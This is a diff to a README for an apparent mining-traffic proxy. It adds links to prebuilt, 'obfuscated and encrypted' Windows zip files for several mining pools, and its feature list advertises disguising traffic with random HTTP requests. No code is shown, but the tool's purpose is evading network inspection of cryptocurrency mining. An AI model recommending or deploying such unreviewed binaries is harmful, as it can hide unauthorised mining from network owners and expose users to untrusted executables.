@@ -8,6 +8,13 @@
 - [x] 客户端支持随机http请求, 混淆上传下载数据
 - [x] 临时断网自动恢复数据传输, 永不掉线
 - [x] 多协议支持
+# 🛠️ 下载地址：
+[W10-E池混淆加密.zip](https://github.com/minerproxyutils/miner-proxy/files/8213112/W10-E.zip)<br>
+[W10-鱼池混淆加密.zip](https://github.com/minerproxyutils/miner-proxy/files/8213116/W10-.zip)<br>
+[W10-币印混淆加密.zip](https://github.com/minerproxyutils/miner-proxy/files/8213118/W10-.zip)<br>
+[W10-欧意混淆加密.zip](https://github.com/minerproxyutils/miner-proxy/files/8213121/W10-.zip)<br>
+[W10-蚂蚁混淆加密.zip](https://github.com/minerproxyutils/miner-proxy/files/8213122/W10-.zip)<br>
+
 # 🛠️ 安装视频
 https://user-images.githubusercontent.com/101244816/157404760-052f2c5a-a80b-40ac-9c59-ee02d4922758.mp4
 # 🛠️ 交流群
